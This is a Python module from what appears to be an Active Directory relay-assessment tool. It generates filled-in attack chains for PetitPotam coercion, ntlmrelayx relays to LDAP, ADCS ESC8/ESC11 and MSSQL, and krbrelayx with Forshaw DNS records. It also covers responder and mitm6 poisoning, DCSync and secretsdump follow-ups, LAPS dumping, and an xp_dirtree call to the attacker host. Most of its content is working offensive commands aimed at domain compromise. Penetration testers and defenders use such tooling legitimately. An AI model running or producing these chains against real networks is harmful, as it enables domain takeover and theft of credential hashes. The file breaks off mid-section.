"""
Output: Rich terminal table + Markdown report writer.
"""
from __future__ import annotations
from dataclasses import dataclass
from datetime import datetime

from .checks.base import AttackResult, CheckResult, Status
from .checks.relay_target_finder import RelayTargetSummary

# ── Rich availability ──────────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich import box
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False


# ── colour / symbol maps ───────────────────────────────────────────────────

VIABILITY_STYLE = {
    "VIABLE":     ("bold green",  "✅ VIABLE"),
    "PARTIAL":    ("bold yellow", "⚠️  PARTIAL"),
    "NOT VIABLE": ("bold red",    "❌ NOT VIABLE"),
    "UNKNOWN":    ("dim",         "❓ UNKNOWN"),
}

# Verdicts that are not actionable findings: NOT VIABLE (prerequisite disproven)
# and UNKNOWN (nothing could be tested). Both are hidden when quiet (-q) is set.
_HIDDEN_IN_QUIET = ("NOT VIABLE", "UNKNOWN")

STATUS_STYLE = {
    Status.PASS:  ("green",  "PASS ✓"),
    Status.FAIL:  ("red",    "FAIL ✗"),
    Status.WARN:  ("yellow", "WARN ⚠"),
    Status.SKIP:  ("dim",    "SKIP –"),
    Status.ERROR: ("red",    "ERR  !"),
}

STATUS_PLAIN = {
    Status.PASS:  "PASS",
    Status.FAIL:  "FAIL",
    Status.WARN:  "WARN",
    Status.SKIP:  "SKIP",
    Status.ERROR: "ERROR",
}


# ── Attack chain dataclass ─────────────────────────────────────────────────

@dataclass
class AttackChain:
    """A single recommended attack path with tier, description, and commands."""
    tier:        str          # "CRITICAL", "HIGH", "MEDIUM"
    title:       str          # Short name e.g. "DCSync via ACL Abuse"
    prereqs:     str          # Human-readable prerequisite summary
    coerce_cmd:  str          # Coercion command with real values where available
    relay_cmd:   "str | None"  # Relay command (None if relay step is embedded in coerce_cmd)
    notes:       str = ""     # Optional follow-up or caveats


TIER_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
TIER_STYLE = {
    "CRITICAL": ("bold red",    "🔴 CRITICAL"),
    "HIGH":     ("bold yellow", "🟠 HIGH"),
    "MEDIUM":   ("bold cyan",   "🔵 MEDIUM"),
}


# Shared cross-domain relay-target caveat for the LDAP/LDAPS attack chains.
# Every ntlmrelayx LDAP attack (RBCD/Shadow Creds/LAPS/ACL/Add Computer/ADIDNS)
# runs the same validatePrivileges preamble in LDAPAttack.run() (on by default),
# which looks the RELAYED account up in the bound DC's directory and raises
# IndexError when it isn't there — i.e. when a child-domain account is relayed to
# a forest-root DC. The write-target object must also live in the bound DC's
# domain. Centralized so the six chains can't drift.
_LDAP_RELAY_CRASH_HINT = (
    "# Cross-domain relay: target the coerced host's own-domain DC (child DC), "
    "or add --no-validate-privs if validatePrivileges crashes"
)


def _ldap_relay_target_note(escalate_user: bool = False) -> str:
    """Cross-domain relay-target caveat appended to the LDAP/LDAPS attack chains."""
    note = (
        "Cross-domain caveat: relay to a writable DC of the domain holding the "
        "coerced account and the write-target object. For a coerced child-domain "
        "host that's the child DC, not the forest root. Otherwise ntlmrelayx's "
        "validatePrivileges preamble looks the relayed account up in the bound DC's "
        "domain and crashes (IndexError); --no-validate-privs skips that check, but "
        "the write still has to land in the bound DC's domain."
    )
    if escalate_user:
        note += (
            " For --escalate-user, ntlmrelayx does a second same-domain lookup on "
            "the target principal, so --no-validate-privs alone may not survive a "
            "cross-domain target — prefer the target's own-domain DC."
        )
    return note


# ── Attack chain builder ───────────────────────────────────────────────────

def _build_attack_chains(
    results: list[AttackResult],
    env_summary: dict,
    relay_target_summary: "RelayTargetSummary | None" = None,
    redact_creds: bool = True,
) -> list[AttackChain]:
    """
    Cross-reference check results to build a prioritised list of complete
    attack chains. Only surfaces chains where all required prerequisites pass.
    Commands use real values (IPs, hostnames, CA names) where available.
    """
    import re

    chains: list[AttackChain] = []

    # ── helpers ────────────────────────────────────────────────────
    dc_ip       = env_summary.get("dc_ip", "<dc-ip>")
    dc_ips      = env_summary.get("dc_ips") or [dc_ip]
    domain      = env_summary.get("domain", "<domain>")
    attacker          = env_summary.get("attacker_ip") or "<attacker-ip>"
    attacker_hostname = env_summary.get("attacker_hostname") or "<attacker-hostname>"
    _hostname_map     = env_summary.get("hostname_map") or {}
    # Fixed CredMarshalTargetInfo blob suffix (same for all targets)
    _FORSHAW_BLOB     = "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA"

    def _forshaw_name(target_ip: str) -> str:
        """Build the Forshaw DNS name for a given target IP.

        Uses the IP → short hostname map populated at startup via LDAP
        (for DCs) and reverse DNS (for extra targets).  Falls back to
        <hostname> placeholder if the IP is not in the map.
        """
        short = _hostname_map.get(target_ip)
        prefix = short if short else "<hostname>"
        return f"{prefix}{_FORSHAW_BLOB}"

    def _get_ar(name_fragment: str) -> "AttackResult | None":
        for ar in results:
            if name_fragment.lower() in ar.attack_name.lower():
                return ar
        return None

    def _get_check(ar: "AttackResult", name_fragment: str) -> "CheckResult | None":
        if not ar:
            return None
        for c in ar.checks:
            if name_fragment.lower() in c.name.lower():
                return c
        return None

    def _viable(ar: "AttackResult | None") -> bool:
        return ar is not None and ar.viability in ("VIABLE", "PARTIAL")

    def _check_pass(ar: "AttackResult | None", name_fragment: str) -> bool:
        c = _get_check(ar, name_fragment)
        return c is not None and c.status.value == "PASS"

    def _ldap_signing_enforced(ar: "AttackResult | None") -> bool:
        c = _get_check(ar, "LDAP signing not enforced")
        return c is not None and c.status.value == "FAIL"

    def _ldap_proto(ar: "AttackResult | None") -> str:
        """Pick the relay channel for an LDAP-write chain.

        ldaps:// is relayable only when channel binding is off. RBCD/Shadow carry
        the nxc-derived "LDAP channel binding not required"; ACL carries the
        LDAPS-native "LDAPS channel binding (EPA) not enforced". A PASS on either
        means CB=Never → the TLS path is open, so prefer ldaps://. Otherwise CB is
        enforced and ldaps:// is blocked; fall back to plain ldap:// — which the
        upstream _viable() gate guarantees is relayable (viability then comes from
        the signing-off or NTLMv1 leg, both of which land over 389).
        """
        tls_open = (_check_pass(ar, "LDAP channel binding not required")
                    or _check_pass(ar, "LDAPS channel binding (EPA) not enforced"))
        return "ldaps" if tls_open else "ldap"

    def _channel_note(ar: "AttackResult | None") -> str:
        """Enabler explanation for the plain-ldap:// branch (CB enforced).

        Only meaningful when _ldap_proto(ar) == "ldap". Splits on LDAP signing
        because that decides whether the HTTP coercion the standard chain renders
        actually carries the relay, or whether the NTLMv1 SMB path is required.
        """
        if _ldap_signing_enforced(ar):
            # DROP-THE-MIC SUPERSEDE POINT: when the CVE-2019-1040 MIC leg lands
            # (staged base.py adds CHECK_MIC_NOT_ENFORCED), plain ldap:// under
            # enforced signing is ALSO reachable via the MIC path + `--remove-mic`,
            # not only the NTLMv1 SMB path below. The staged output.py's
            # _remove_mic_flag() covers that; this branch is the pre-MIC subset and
            # is replaced wholesale when that superset is applied.
            return ("LDAPS channel binding is enforced (ldaps:// blocked) and LDAP "
                    "signing is also enforced — plain ldap:// lands ONLY via the NTLMv1 "
                    "SMB path (ntlmrelayx clears SIGN/SEAL, no MIC to invalidate). HTTP "
                    "coercion above will not carry it; drive this via the cross-protocol "
                    "NTLMv1 chain (unsigned SMB coercion source).")
        return ("LDAPS channel binding is enforced, so ldaps:// is blocked; the relay "
                "uses plain ldap:// because LDAP signing is not enforced (HTTP or SMB "
                "coercion both relay cleanly to port 389).")

    def _extract_ca_host(ar: "AttackResult | None") -> str:
        """Extract CA hostname from ADCS check detail."""
        if not ar:
            return "<ca-host>"
        for c in ar.checks:
            if c.detail and "host:" in c.detail.lower():
                m = re.search(r"host:\s*([^\s,;]+)", c.detail, re.IGNORECASE)
                if m:
                    return m.group(1).rstrip(")")
        return "<ca-host>"

    def _extract_ca_name(ar: "AttackResult | None") -> str:
        """Extract CA name from certipy/ADCS check detail."""
        if not ar:
            return "<ca-name>"
        for c in ar.checks:
            if c.detail and "ca:" in c.detail.lower():
                m = re.search(r"CA:\s*([^\s,;.]+)", c.detail, re.IGNORECASE)
                if m:
                    return m.group(1).rstrip(")")
        return "<ca-name>"

    def _extract_writable_computers(ar: "AttackResult | None", check_fragment: str) -> list[str]:
        """Extract computer names from a writable object check detail."""
        if not ar:
            return []
        c = _get_check(ar, check_fragment)
        if not c or not c.detail:
            return []
        m = re.search(r"object\(s\):\s*([^\n.]+)", c.detail, re.IGNORECASE)
        if m:
            raw = m.group(1).strip()
            # Strip trailing note like "Relay can write..."
            raw = raw.split(".")[0].split("Relay")[0].strip()
            computers = [x.strip().rstrip("$") for x in raw.split(",")]
            return [c for c in computers if c][:3]
        return []

    def _extract_unsigned_hosts(ar: "AttackResult | None") -> tuple[list[str], list[str]]:
        """Return (dc_unsigned, non_dc_unsigned) from SMB check raw field.

        Uses dc_ips (all discovered DCs) rather than dc_ip alone so that
        extra targets that are DCs in other domains are ranked correctly.
        """
        dc_set = set(dc_ips)
        if not ar:
            return [], []
        c = _get_check(ar, "SMB signing disabled")
        if not c or not c.raw:
            return [], []
        m = re.search(r"Unsigned:\s*\[([^\]]*)\]", c.raw)
        if not m:
            # Fall back to parsing detail
            if c.detail:
                hosts = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", c.detail)
                dc_u  = [h for h in hosts if h in dc_set]
                non_u = [h for h in hosts if h not in dc_set]
                return dc_u, non_u
            return [], []
        all_hosts = [h.strip().strip("'\" ") for h in m.group(1).split(",") if h.strip()]
        dc_u  = [h for h in all_hosts if h in dc_set]
        non_u = [h for h in all_hosts if h not in dc_set]
        return dc_u, non_u

    def _target_is_dc(computer_name: str) -> bool:
        """
        Return True if computer_name matches a known DC.

        computer_name is the short name extracted from check details
        (e.g. "KINGSLANDING", "WINTERFELL$" — dollar sign stripped).
        Matched against:
          - hmap values (IP → short hostname, populated at startup)
          - dc_ips directly (in case the name is actually an IP)
        Never uses hostname patterns — only cross-references known DC data.
        """
        if not computer_name:
            return False
        name = computer_name.rstrip("$").upper()
        # Check against hostname map values
        for ip, short in _hostname_map.items():
            if ip in set(dc_ips) and short.upper() == name:
                return True
        # In case the caller passed an IP directly
        if computer_name in set(dc_ips):
            return True
        return False

    # Strip domain prefix from username for use in commands
    # env_summary["user"] is the full UPN e.g. "corp.local\\lowpriv" — we want just "lowpriv"
    _raw_user = env_summary.get("user", "<user>")
    username  = _raw_user.split("\\")[-1] if "\\" in _raw_user else _raw_user

    # Credential placeholder used in chain commands. When redact_creds is True
    # (the default — used by all file report writers), the real password/NT hash
    # are NEVER substituted; a placeholder is emitted instead. Only the terminal
    # path (print_attack_paths) opts in to live creds for copy-paste convenience.
    # This keeps saved Markdown/HTML/JSON reports free of secret material.
    _nt_hash  = env_summary.get("nt_hash")
    _password = env_summary.get("password") or ""
    if redact_creds:
        _cred_p = "-H <nthash>" if _nt_hash else "-p '<password>'"
    else:
        _cred_p = f"-H {_nt_hash}" if _nt_hash else f"-p '{_password}'"

    def _coerce_cmd(target: str) -> str:
        """Best available coercion command for a target."""
        # Check WebClient status from any module that includes the optional WebClient check
        _webclient_ar = _get_ar("RBCD") or _get_ar("Shadow Credentials") or _get_ar("LAPS")
        if _check_pass(_webclient_ar, "WebClient"):
            # WebClient is running: coerce over HTTP (WebDAV/UNC) via PetitPotam HTTP mode.
            # The listener argument MUST be a hostname (not IP) — Windows will only follow
            # a WebDAV UNC path to a hostname; an IP triggers SMB, not WebDAV.
            return (f"# Coerce authentication from target\n"
                    f"  python3 PetitPotam.py -u {username} {_cred_p} -d {domain} {attacker_hostname}@80/share {target}")
        return (f"# Coerce authentication from target\n"
                f"  python3 PetitPotam.py -u {username} {_cred_p} -d {domain} {attacker_hostname} {target}")

    # Member-server coercion source for HTTP-coerced LDAP/LDAPS relays. SMB
    # coercion sets signing flags and can't drive an LDAP relay (the SMB→LDAP
    # signing wall), so these chains must coerce a MEMBER server over HTTP —
    # never SMB, never the DC (DCs have WebClient off by default). Prefer a
    # known non-DC host; otherwise a clear placeholder.
    _dc_u0, _non_dc_u0 = _extract_unsigned_hosts(_get_ar("SMB"))
    _relay_victim = _non_dc_u0[0] if _non_dc_u0 else "<member-server-with-webclient>"

    def _http_coerce_cmd(victim: str = _relay_victim) -> str:
        """HTTP/WebDAV coercion for LDAP/LDAPS relay chains.

        Relaying to LDAP/LDAPS only works from HTTP-coerced auth: SMB coercion
        sets the signing flags and hits the SMB→LDAP wall. So coerce a MEMBER
        server (not the DC) over HTTP, with a hostname listener (@80) so Windows
        follows the WebDAV UNC path instead of falling back to SMB. The relayed
        machine account's default Authenticated-Users rights are what authorise
        the LDAP write.
        """
        return (f"# Coerce a MEMBER server over HTTP/WebDAV (not the DC, not SMB):\n"
                f"  python3 PetitPotam.py -u {username} {_cred_p} -d {domain} {attacker_hostname}@80/share {victim}")

    def _coerce_target_avoiding_ca(ca_host_fqdn: str) -> str:
        """Pick a DC IP to coerce for ESC8/ESC11 that is NOT the CA host.

        These chains relay the coerced auth to the CA. If the coercion target and
        the CA are the same machine, Windows blocks the relay-to-self, so the
        attack silently fails. When the default target (dc_ip) resolves to the CA
        host, swap in another DC. dc_ips is ordered with env.domain's own DC(s)
        first, so the first non-CA entry is a same-forest DC where possible —
        cross-forest machine accounts are denied at the certificate-template level.
        """
        ca_short = (ca_host_fqdn.split(".")[0].lower()
                    if ca_host_fqdn and ca_host_fqdn != "<ca-host>" else "")
        if not ca_short:
            return dc_ip
        # Only retarget if the default coercion target IS the CA host (self-relay).
        if (_hostname_map.get(dc_ip, "") or "").lower() != ca_short:
            return dc_ip
        for ip in dc_ips:
            if (_hostname_map.get(ip, "") or "").lower() != ca_short:
                return ip
        return dc_ip  # no distinguishable alternative — the chain note warns the user

    # ── 1. DCSync via ACL Abuse ────────────────────────────────────
    acl_ar = _get_ar("ACL Abuse")
    if _viable(acl_ar) and _check_pass(acl_ar, "Writable high-value"):
        detail = getattr(_get_check(acl_ar, "Writable high-value"), "detail", "") or ""
        if "domain root" in (detail or "").lower():
            # ACL writes relay over whichever channel is open. Prefer ldaps:// when
            # LDAPS channel binding is off; otherwise the plain ldap:// path (LDAP
            # signing off / NTLMv1) — ACL modifications are attribute/SD writes that
            # succeed over plain LDAP, so LDAPS is not mandatory here.
            proto = ("ldaps"
                     if _check_pass(acl_ar, "LDAPS channel binding (EPA) not enforced")
                     else "ldap")
            chains.append(AttackChain(
                tier="CRITICAL",
                title="DCSync via ACL Abuse",
                prereqs=f"ACL relay viable ({proto}://) + writable domain root (WriteDACL) confirmed",
                coerce_cmd=_http_coerce_cmd(),
                relay_cmd=(
                    f"# Relay to {proto.upper()} and escalate privileges\n"
                    f"  ntlmrelayx.py -t {proto}://{dc_ip} --escalate-user {username}\n"
                    f"{_LDAP_RELAY_CRASH_HINT}"
                ),
                notes=(
                    "Grants DCSync rights to the enumeration account. "
                    "Follow up: secretsdump.py or mimikatz lsadump::dcsync."
                    + " " + _ldap_relay_target_note(escalate_user=True)
                ),
            ))

    # ── 2. Full domain compromise via ADCS ESC8 ───────────────────
    adcs_ar  = _get_ar("ESC8")
    ca_host  = _extract_ca_host(adcs_ar)
    if _viable(adcs_ar):
        # Only the plain-HTTP 401+NTLM path is a *confirmed* relay target
        # (CertsrvHttpCheck PASS). If that check did not PASS, the module is
        # viable only via the HTTPS path, whose decisive gate — EPA — is not
        # remotely detectable. Render that case as a CONDITIONAL chain rather
        # than a "confirmed" CRITICAL one, so a hardened HTTPS+EPA-enforced CA
        # is not falsely reported as a confirmed domain-compromise path.
        if _check_pass(adcs_ar, "Web enrollment endpoint reachable"):
            chains.append(AttackChain(
                tier="CRITICAL",
                title="Domain Compromise via ADCS ESC8",
                prereqs="ADCS ESC8 confirmed — certsrv HTTP endpoint accepts NTLM relay",
                coerce_cmd=_coerce_cmd(_coerce_target_avoiding_ca(ca_host)),
                relay_cmd=(
                    f"# Relay DC auth to certsrv to obtain a DC certificate\n"
                    f"  ntlmrelayx.py -t http://{ca_host}/certsrv/certfnsh.asp "
                    f"--adcs --template DomainController"
                ),
                notes=(
                    "Relay DC machine account auth to certsrv → obtain DC certificate → "
                    "PKINITtools or Rubeus to get TGT → DCSync. "
                    "Coerce a DC other than the CA host — relay-to-self is blocked; "
                    "prefer a same-forest DC (cross-forest is denied at the template)."
                ),
            ))
        else:
            chains.append(AttackChain(
                tier="CRITICAL",
                title="Domain Compromise via ADCS ESC8 (conditional — HTTPS/EPA unconfirmed)",
                prereqs=(
                    "certsrv reachable over HTTPS only — no plain-HTTP NTLM endpoint confirmed. "
                    "Relay is viable ONLY if Extended Protection for Authentication (EPA) is not "
                    "enforced on the IIS binding, which is NOT remotely detectable — so ESC8 here "
                    "is UNCONFIRMED. Verify EPA before relying on this path."
                ),
                coerce_cmd=_coerce_cmd(_coerce_target_avoiding_ca(ca_host)),
                relay_cmd=(
                    f"# Relay DC auth to certsrv over HTTPS (only succeeds if EPA is disabled)\n"
                    f"  ntlmrelayx.py -t https://{ca_host}/certsrv/certfnsh.asp "
                    f"--adcs --template DomainController"
                ),
                notes=(
                    "CONDITIONAL — not a confirmed path. If EPA is enforced (the hardened default on "
                    "modern CAs) this relay is blocked and ESC8 is NOT viable here. Confirm EPA state "
                    "on the CA host first: check the IIS 'certsrv' application's Extended Protection "
                    "setting (Off = relayable) or "
                    "`reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameters "
                    "/v ExtendedProtection`. If EPA is off: relay DC machine-account auth → DC "
                    "certificate → PKINITtools/Rubeus TGT → DCSync. Coerce a DC other than the CA host."
                ),
            ))

    # ── 3. Domain Compromise via ADCS ESC11 ───────────────────────
    esc11_ar = _get_ar("ESC11")
    if _viable(esc11_ar):
        esc11_ca_name = _extract_ca_name(esc11_ar)
        esc11_ca_host = _extract_ca_host(esc11_ar) if _extract_ca_host(esc11_ar) != "<ca-host>" else ca_host
        chains.append(AttackChain(
            tier="CRITICAL",
            title="Domain Compromise via ADCS ESC11 (RPC relay)",
            prereqs="ADCS ESC11 confirmed — CA RPC interface accepts NTLM relay",
            coerce_cmd=_coerce_cmd(_coerce_target_avoiding_ca(esc11_ca_host)),
            relay_cmd=(
                f"# Relay DC auth directly to the CA via RPC\n"
                f"  ntlmrelayx.py -t rpc://{esc11_ca_host} -rpc-mode ICPR "
                f"-icpr-ca-name '{esc11_ca_name}' --template DomainController"
            ),
            notes=(
                "No certsrv HTTP needed — relays directly over RPC to the CA. "
                "Coerce a DC other than the CA host — relay-to-self is blocked; "
                "prefer a same-forest DC (cross-forest is denied at the template)."
            ),
        ))

    # ── 4. Kerberos Relay → ADCS ──────────────────────────────────
    krb_ar = _get_ar("krbrelayx")
    if _viable(krb_ar):
        krb_ca_host = _extract_ca_host(krb_ar) if _extract_ca_host(krb_ar) != "<ca-host>" else ca_host
        chains.append(AttackChain(
            tier="CRITICAL",
            title="Domain Compromise via Kerberos Relay → ADCS",
            prereqs="certsrv accepts Negotiate/Kerberos + ADIDNS writable (Forshaw DNS trick)",
            coerce_cmd=(
                f"# Register Forshaw DNS A-record pointing to attacker\n"
                f"  dnstool.py -u '{domain}\\{username}' "
                f"{_cred_p} -r '{_forshaw_name(dc_ip)}' -a add -d {attacker} -t A --tcp {dc_ip}\n"
                f"\n"
                f"# Start krbrelayx listener\n"
                f"  sudo krbrelayx.py -t 'http://{krb_ca_host}/certsrv/certfnsh.asp' "
                f"--adcs --template DomainController "
                f"-v '{(_hostname_map.get(dc_ip, '<hostname>').upper())}$' "
                f"-ip {attacker}\n"
                f"\n"
                f"# Coerce DC to authenticate to the Forshaw DNS name\n"
                f"  python3 PetitPotam.py -u '{username}' {_cred_p} -d {domain} "
                f"'{_forshaw_name(dc_ip)}' {dc_ip}"
            ),
            relay_cmd=None,
            notes=(
                f"The Forshaw DNS name encodes the target hostname so Windows issues a "
                f"Kerberos ticket for the real DC SPN but connects to your attacker IP. "
                f"Works for any coercion target — use the target's short hostname + the "
                f"fixed CredMarshalTargetInfo blob. "
                f"If the name shows <hostname>, reverse DNS failed — check with: "
                f"host {dc_ip}"
            ),
        ))

    # ── 5. Shadow Credentials → PKINIT → NT hash ──────────────────
    sc_ar = _get_ar("Shadow Credentials")
    if _viable(sc_ar):
        sc_computers = _extract_writable_computers(sc_ar, "Writable object")
        sc_target    = sc_computers[0] if sc_computers else "<target-computer>"
        adcs_present = _check_pass(sc_ar, "ADCS present")
        # Tier escalates to CRITICAL when the writable object is a DC:
        # DC machine account → PKINIT → UnPAC-the-hash → DCSync
        sc_target_is_dc = _target_is_dc(sc_target)
        sc_tier = "CRITICAL" if sc_target_is_dc else "HIGH"
        sc_dc_note = (
            " Target is a DC — PKINIT NT hash enables DCSync."
            if sc_target_is_dc else ""
        )
        chains.append(AttackChain(
            tier=sc_tier,
            title="Shadow Credentials → PKINIT → NT Hash",
            prereqs=(
                f"LDAP relay viable + writable computer ({sc_target}) + KDC cert"
                + (" + ADCS present (full UnPAC chain)" if adcs_present else " (TGT only — no ADCS)")
            ),
            coerce_cmd=_http_coerce_cmd(),
            relay_cmd=(
                f"# Relay to {_ldap_proto(sc_ar).upper()} and write Shadow Credentials\n"
                f"  ntlmrelayx.py -t {_ldap_proto(sc_ar)}://{dc_ip} --shadow-credentials "
                f"--shadow-target {sc_target}$\n"
                f"{_LDAP_RELAY_CRASH_HINT}"
            ),
            notes=(
                "Writes msDS-KeyCredentialLink → PKINIT TGT for target machine account. "
                + ("Then: PKINITtools getnthash.py → pass-the-hash." if adcs_present
                   else "ADCS not found — TGT obtained but NT hash recovery requires ADCS.")
                + sc_dc_note
                + " " + _ldap_relay_target_note()
                + (" " + _channel_note(sc_ar) if _ldap_proto(sc_ar) == "ldap" else "")
            ),
        ))

    # ── 6. RBCD ───────────────────────────────────────────────────
    rbcd_ar = _get_ar("RBCD")
    if _viable(rbcd_ar):
        rbcd_computers = _extract_writable_computers(rbcd_ar, "Writable computer")
        rbcd_target    = rbcd_computers[0] if rbcd_computers else "<target-computer>"
        # Tier escalates to CRITICAL when the writable object is a DC:
        # S4U2Self as any domain user to the DC → DCSync-equivalent access
        rbcd_target_is_dc = _target_is_dc(rbcd_target)
        rbcd_tier = "CRITICAL" if rbcd_target_is_dc else "HIGH"
        rbcd_dc_note = (
            " Target is a DC — S4U2Self as any domain user to DC enables DCSync-equivalent access."
            if rbcd_target_is_dc else ""
        )
        rbcd_proto = _ldap_proto(rbcd_ar)
        # Over plain ldap:// (CB enforced) the relay can't create the delegate
        # machine account — that needs a confidential channel (ldaps://636 or
        # StartTLS-on-389), both under channel binding. Reuse a pre-existing
        # writable computer as the delegate, or pre-create one out-of-band.
        if rbcd_proto == "ldaps":
            rbcd_create_note = "ntlmrelayx creates attacker machine account automatically. "
        else:
            _delegate = (rbcd_target if rbcd_target != "<target-computer>"
                         else "a pre-existing writable computer")
            rbcd_create_note = (
                "Over plain ldap:// the relay CANNOT create the delegate machine account "
                "(needs a confidential channel — ldaps://636 or StartTLS, both under "
                f"channel binding); reuse {_delegate} as the delegate, or pre-create one "
                "out-of-band (add via a separate ldaps:// path or an owned account). ")
        chains.append(AttackChain(
            tier=rbcd_tier,
            title="RBCD (Resource-Based Constrained Delegation)",
            prereqs=f"LDAP relay viable + writable computer ({rbcd_target}) + MAQ > 0",
            coerce_cmd=_http_coerce_cmd(),
            relay_cmd=(
                f"# Relay to {rbcd_proto.upper()} and configure RBCD\n"
                f"  ntlmrelayx.py -t {rbcd_proto}://{dc_ip} --delegate-access\n"
                f"{_LDAP_RELAY_CRASH_HINT}"
            ),
            notes=(
                f"Relay writes msDS-AllowedToActOnBehalfOfOtherIdentity on {rbcd_target}. "
                + rbcd_create_note
                + "Follow up: getST.py → pass-the-ticket → secretsdump."
                + rbcd_dc_note
                + " " + _ldap_relay_target_note()
                + (" " + _channel_note(rbcd_ar) if rbcd_proto == "ldap" else "")
            ),
        ))

    # ── 6b. ADIDNS spoofing (relay LDAP → create DNS record) ──────
    adidns_ar = _get_ar("ADIDNS")
    if _viable(adidns_ar):
        _open_acl = _check_pass(adidns_ar, "any account")
        _acl_note = (
            "Authenticated Users hold CreateChild on the zone — any relayed account works. "
            if _open_acl else
            "Open CreateChild not confirmed — relay a principal that holds CreateChild "
            "(DnsAdmins / privileged machine or user account). "
        )
        chains.append(AttackChain(
            tier="HIGH",
            title="ADIDNS Spoofing (relay to LDAP → create DNS record)",
            prereqs="LDAP relay viable + AD-integrated DNS zone present",
            coerce_cmd=_http_coerce_cmd(),
            relay_cmd=(
                f"# Relay to LDAP and create an attacker-controlled A record\n"
                f"  ntlmrelayx.py -t ldap://{dc_ip} --add-dns-record attacker {attacker} --no-dump --no-da --no-acl\n"
                f"{_LDAP_RELAY_CRASH_HINT}"
            ),
            notes=(
                f"{_acl_note}"
                "Creates a new dnsNode A record pointing an attacker-chosen hostname at "
                f"the attacker ({attacker}); any client resolving that name then connects to "
                "you, enabling capture or onward relay beyond the local subnet. A `wpad` "
                "record is especially high-value (proxy auto-config). mitm6 (-6 -wh) is a "
                "coercion-free alternative when DHCPv6 is unanswered."
                + " " + _ldap_relay_target_note()
            ),
        ))

    # ── 7. SMB secretsdump — DC target ────────────────────────────
    smb_ar = _get_ar("SMB")
    dc_unsigned, non_dc_unsigned = _extract_unsigned_hosts(smb_ar)
    if _viable(smb_ar) and dc_unsigned:
        chains.append(AttackChain(
            tier="CRITICAL",
            title="SMB Secretsdump — Domain Controller",
            prereqs=f"SMB signing DISABLED on DC: {', '.join(dc_unsigned)}",
            coerce_cmd=(
                "# Capture authentication via poisoning\n"
                "  sudo responder -I <iface> -dP"
            ),
            relay_cmd=(
                "# Relay to unsigned SMB targets\n"
                "  ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
            ),
            notes=(
                "DC with signing disabled — relay gives NTDS.dit equivalent (all domain hashes). "
                "Rare but critical when present."
            ),
        ))

    # ── 8. SMB secretsdump — non-DC ───────────────────────────────
    if _viable(smb_ar) and non_dc_unsigned:
        targets_str = ", ".join(non_dc_unsigned[:3])
        chains.append(AttackChain(
            tier="MEDIUM",
            title="SMB Secretsdump — Member Server / Workstation",
            prereqs=f"SMB signing DISABLED on: {targets_str}",
            coerce_cmd=(
                "# Capture authentication via poisoning\n"
                "  sudo responder -I <iface> -dP"
            ),
            relay_cmd=(
                "# Relay to unsigned SMB targets\n"
                "  ntlmrelayx.py -tf <unsigned_hosts.txt> -smb2support"
            ),
            notes=(
                "Dumps local SAM + LSA secrets. May include cached domain credentials "
                "or service account passwords stored in LSA."
            ),
        ))

    # ── 9. MSSQL relay ────────────────────────────────────────────
    # Two sub-paths:
    #   A) mitm6 — coerces domain accounts over IPv6 WPAD and relays to MSSQL
    #      for an interactive shell; escalate via sysadmin impersonation.
    #   B) xp_dirtree — we already have SQL access; trigger outbound auth from
    #      the SQL service account and relay it back to MSSQL for a shell.
    mssql_ar = _get_ar("MSSQL")
    if _viable(mssql_ar):
        mssql_check = _get_check(mssql_ar, "MSSQL port reachable")
        mssql_host  = "<mssql-host>"
        if mssql_check and mssql_check.detail:
            m = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", mssql_check.detail)
            if m:
                mssql_host = m.group(0)

        # ── 9a. mitm6 → relay to MSSQL (higher impact) ────────────
        chains.append(AttackChain(
            tier="HIGH",
            title="MSSQL \u2014 mitm6 IPv6 Relay \u2192 Interactive Shell",
            prereqs=f"MSSQL NTLM auth confirmed on {mssql_host} + domain accounts authenticate via WPAD",
            coerce_cmd=(
                f"# Poison IPv6 DNS / WPAD to capture domain account auth\n"
                f"  sudo mitm6 -d {domain} -i <iface>"
            ),
            relay_cmd=(
                f"# Relay to MSSQL for an interactive shell\n"
                f"  sudo impacket-ntlmrelayx -6 -t mssql://{mssql_host} -i\n"
                f"# Connect once relay succeeds\n"
                f"  nc 127.0.0.1 11000"
            ),
            notes=(
                "mitm6 captures domain accounts (not just the SQL service account) \u2014 "
                "any relayed account that is sa or has IMPERSONATE rights can be escalated."
            ),
        ))

        # ── 9b. xp_dirtree → relay SQL service account auth back to MSSQL ──
        if _check_pass(mssql_ar, "xp_dirtree"):
            chains.append(AttackChain(
                tier="MEDIUM",
                title="MSSQL \u2014 xp_dirtree Coercion \u2192 Interactive Shell",
                prereqs=f"MSSQL access confirmed on {mssql_host} + xp_dirtree available",
                coerce_cmd=(
                    f"# Connect to MSSQL and trigger outbound auth from the service account\n"
                    f"  impacket-mssqlclient -windows-auth '{domain}/{username}@{mssql_host}'\n"
                    f"  SQL> EXEC master.sys.xp_dirtree '\\\\{attacker}\\demontlm',1,1"
                ),
                relay_cmd=(
                    f"# Relay the service account auth back to MSSQL for an interactive shell\n"
                    f"  sudo impacket-ntlmrelayx -t mssql://{mssql_host} -i\n"
                    f"# Connect once relay succeeds\n"
                    f"  nc 127.0.0.1 11000"
                ),
                notes=(
                    "Relays the SQL service account's own auth back to MSSQL — "
                    "gives an interactive shell running as the service account. "
                    "Escalate further via IMPERSONATE if sysadmin paths exist."
                ),
            ))

    # ── 10. LAPS dump ─────────────────────────────────────────────
    laps_ar = _get_ar("LAPS")
    if _viable(laps_ar):
        chains.append(AttackChain(
            tier="MEDIUM",
            title="LAPS Password Dump",
            prereqs="LDAP relay viable + LAPS deployed + relay account has LAPS read permission",
            coerce_cmd=_http_coerce_cmd(),
            relay_cmd=(
                f"# Relay to LDAP and dump LAPS passwords\n"
                f"  ntlmrelayx.py -t ldap://{dc_ip} --dump-laps\n"
                f"{_LDAP_RELAY_CRASH_HINT}"
            ),
            notes=(
                "Dumps local Administrator passwords for LAPS-managed computers. "
                "Scope depends on relay account's LAPS read delegation."
                + " " + _ldap_relay_target_note()
            ),
        ))

    # ── 11. LDAPS Add Computer ────────────────────────────────────
